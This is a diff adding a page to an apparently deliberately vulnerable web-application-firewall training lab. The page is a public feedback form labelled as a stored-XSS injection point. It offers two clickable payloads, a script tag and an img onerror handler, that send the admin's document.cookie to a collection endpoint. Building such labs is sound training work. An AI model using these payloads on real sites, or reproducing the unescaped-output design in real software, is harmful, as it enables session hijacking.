@@ -1,0 +1,41 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Send us feedback — DP WAF lab</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <header>
+    <div class="logo"><span>DP</span> WAF — Public Feedback</div>
+  </header>
+  <main>
+    <nav><a href="index.html">← lab</a> · step 1 of 3</nav>
+    <div class="banner">⚠ Vulnerable by design. This public form is the <b>stored-XSS injection point</b> —
+      whatever you submit is later shown to an admin unescaped.</div>
+
+    <div class="panel">
+      <h2>We value your feedback</h2>
+      <p class="sub">Anyone can submit — no login required. An administrator reviews messages in their dashboard.</p>
+      <label>Your name</label>
+      <input type="text" id="name" placeholder="Jane Customer" autocomplete="off">
+      <label>Message</label>
+      <input type="text" id="message" placeholder="Great product!" autocomplete="off">
+
+      <div class="payloads">
+        <p class="sub" style="margin-bottom:.25rem">Attacker payloads (click to fill the message — these steal the admin's session cookie):</p>
+        <code onclick="fillMsg(this)">&lt;script&gt;new Image().src='/api/collect?c='+encodeURIComponent(document.cookie)&lt;/script&gt;</code>
+        <code onclick="fillMsg(this)">&lt;img src=x onerror="new Image().src='/api/collect?c='+document.cookie"&gt;</code>
+      </div>
+
+      <div class="row"><button onclick="submitFeedback()">Submit feedback</button></div>
+      <pre id="feedbackOut" class="muted">Response will appear here…</pre>
+      <p class="sub">Next: an admin logs in and views this feedback →
+        <a href="login.html">admin login</a>. Keep the <a href="attacker.html">attacker console</a> open in another tab.</p>
+    </div>
+  </main>
+  <footer>DP WAF training lab · vulnerable by design</footer>
+  <script src="app.js"></script>
+</body>
+</html>
